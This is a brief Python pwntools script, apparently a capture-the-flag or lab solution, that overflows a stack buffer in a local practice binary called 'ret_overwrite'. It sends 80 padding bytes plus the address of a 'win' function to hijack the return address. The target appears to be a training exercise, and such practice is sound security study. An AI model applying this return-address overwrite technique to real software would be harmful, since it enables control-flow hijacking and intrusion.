#!/usr/bin/python
from pwn import *

e = ELF("./ret_overwrite")
win_address = e.symbols["win"]
#win_address = 0x400537

p = process("./ret_overwrite")
p.sendline("A" * 80 + p64(win_address))
print p.recv()
